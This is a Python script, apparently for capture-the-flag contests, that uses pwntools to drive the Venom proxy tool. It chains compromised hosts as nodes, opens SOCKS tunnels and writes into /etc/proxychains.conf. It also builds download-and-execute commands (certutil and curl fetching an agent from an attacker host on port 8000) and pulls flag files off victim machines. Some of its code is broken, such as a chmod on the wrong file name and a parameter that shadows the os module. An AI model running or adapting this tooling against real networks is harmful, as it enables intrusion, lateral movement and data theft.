from pwn import *
import time



class AutoProxy:
    def __init__(self):
        self.ProxyDic = "./venom/"
        self.FakePort = 4444
        self.CurrentNum=0
        self.CurrentNode = []
        self.TargetIp={}
        self.CurrentSocks={}
        self.log_file = time.strftime("log_%m%d-%H%M.txt", time.localtime())
        self.AdminProcess = self.SetUp()
        


    def Write(self,log_data):
        '''
        启动代理  Start AutoProxy
        当前节点  eg. A +-- 1
        节点IP   eg. {1: '127.0.0.1'}
        connect  connect 192.168.254.132(ip) 5555(port)
        goto    1.goto ip 1:127.0.0.1
                2.goto node 1:127.0.0.1
        socks   socks (port)
        节点丢失  Lost node:(node) (ip)
        '''
        with open("./log/%s"%(self.log_file), "a") as f:
            log_data = str(log_data)
            localtime = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
            f.write("%s: %s"%(localtime, str(log_data)))
            f.write('\n')
            f.close()

    def StartFakeAgent(self):
        FakeAgentApp = "agent_linux_x64"
        FakeAgentAppAll = self.ProxyDic+FakeAgentApp

        FakeAgentProcess = process([FakeAgentAppAll,"-lport",str(self.FakePort)]) # start a process
        return FakeAgentProcess

    def StartAdmin(self,ip="127.0.0.1"):
        AdminApp = "admin_linux_x64"
        AdminAppAll = self.ProxyDic+AdminApp

        AdminProcess = process([AdminAppAll,"-rhost",ip,"-rport",str(self.FakePort)])
        self.CurrentNum += 1
        self.TargetIp[self.CurrentNum] = ip
        return AdminProcess
    
    def SetUp(self):
        self.StartFakeAgent()
        AdminProcess = self.StartAdmin()
        time.sleep(1)
        AdminProcess.recvuntil(">>> ") # recv a message from process
        AdminProcess.sendline("show")  # send a message to process
        AdminProcess.recvuntil("1")
        AdminProcess.recvuntil(">>> ")
        AdminProcess.sendline("goto 1")
        self.Write("Start AutoProxy")
        return AdminProcess
        
    def Show(self):
        self.AdminProcess.recvuntil(">>> ")
        self.AdminProcess.sendline("show")
        result = bytes.decode(self.AdminProcess.recvuntil("(")[:-1])
       
        
        CurrentNode = self.HandleInfo(result)
        self.NodeMonitor(CurrentNode)
        self.CurrentNode = CurrentNode

        self.Write(result)
        self.Write(str(self.TargetIp))
        print(result)
        print(self.TargetIp)
        return result

    def HandleInfo(self,info):
        '''
        将节点记录成序号
        '''
        result = []
        info = info.split("+ -- ")
        for i in info[1:]:
            result.append(int(i[0]))
        return result

    def Ip2Node(self,ip):
        result = -1
        for i in self.TargetIp:
            if self.TargetIp[i] == ip:
                result = i
                break
        if result == -1:
            print("Ip2Node failed: ip %s could not found"%(ip))
            pass
        return result
    
    def Node2Ip(self,node):
        result = self.TargetIp[node]
        return result

    def GotoNode(self,dest):
        if type(dest) == type("ip"):
            node = self.Ip2Node(dest)
            self.AdminProcess.recvuntil(">>> ")
            self.AdminProcess.sendline("goto %s"%(str(node)))
            self.Write("goto ip %s:%s"%(str(node),dest))
        elif type(dest) == type(1):
            self.AdminProcess.recvuntil(">>> ")
            self.AdminProcess.sendline("goto %s"%(str(dest)))
            self.Write("goto node %s:%s"%(str(dest),self.Node2Ip(dest)))

    def AddNode(self,srcip="127.0.0.1",desip="127.0.0.1",port=5555):
        '''
        从srcip节点连接到desip节点
        更新TargetIp中的节点信息
        '''
        self.GotoNode(srcip) #goto到连接的起点
        self.AdminProcess.recvuntil(">>> ")
        self.AdminProcess.sendline("connect %s %s"%(desip, str(port)))  #连接到目标节点
        connect_info = "connect %s %s"%(desip, str(port))  #写入log的信息
        self.CurrentNum += 1
        self.TargetIp[self.CurrentNum] = desip   #存储新增节点的IP
        time.sleep(1)
        self.Write(connect_info)
        self.GotoNode(1)

    def NodeMonitor(self,Nodelist):
        '''
        监测是否有节点丢失
        '''
        if len(Nodelist) < len(self.CurrentNode): #比较当前节点列表和记录节点的长度
            for i in self.CurrentNode:
                try:
                    Nodelist.index(i)  #查找丢失节点
                except ValueError:
                    self.Write("[-] Lost node %s : %s"%(i,self.Node2Ip(i)))
                    self.TargetIp.pop(i)

    def Proxy(self,ip="192.168.254.132",port=5555):
        self.GotoNode(ip)
        self.AdminProcess.recvuntil(">>> ")
        self.AdminProcess.sendline("socks %s" % str(port))
        socks_info = "socks %s" % str(port)
        self.Write(socks_info)
        with open("./venom/proxychains.tmp", "r") as p1:
            content1 = p1.read()
            content2 = content1.replace("DEADBEEF",str(port))
            with open("/etc/proxychains.conf", "a") as p2:
                p2.write(str(content2))
                p2.close()
            p1.close()
    def DownloadFile(self,ip,os="windows",port=5555):
        if os == "windows":
            command = "certutil -urlcache -split -f http://%s:8000/agent.exe && agent.exe -lport %s"%(ip,str(5555))
        elif os == "linux" or os == "linux_x64":
            command = "curl -o agent_linux_x64 http://%s:8000/agent_linux_x64;chmod +x agent;./agent -lport %s"%(ip,str(5555))
        elif os == "linux_x86":
            command = "curl -o agent_linux_x86 http://%s:8000/agent_linux_x86;chmod +x agent;./agent -lport %s"%(ip,str(5555))
        return command

    def ReadFlag(self,ip,os="windows"):

        if os == "windows":
            command = "download C:\\Users\\Administrator\\Desktop\\flag.txt ./flag"
        elif os == "linux" or os == "linux_x64" or os == "linux_x86":
            command = "download /flag ./flag"

        self.GotoNode(ip)
        self.AdminProcess.recvuntil(">>> ")
        self.AdminProcess.sendline(command)
        with open("./flag","r") as f1:
            flag = f1.read()
            f1.close()
        os.system("rm ./flag")
        return flag


if __name__ == '__main__':
    autoproxy = AutoProxy()
    autoproxy.Show()
    autoproxy.AddNode(srcip="127.0.0.1",desip="192.168.254.132",port=5555)
    autoproxy.Show()
    #print("debug")
    #raw_input()
    autoproxy.Show()
    autoproxy.Proxy(ip="192.168.254.132")
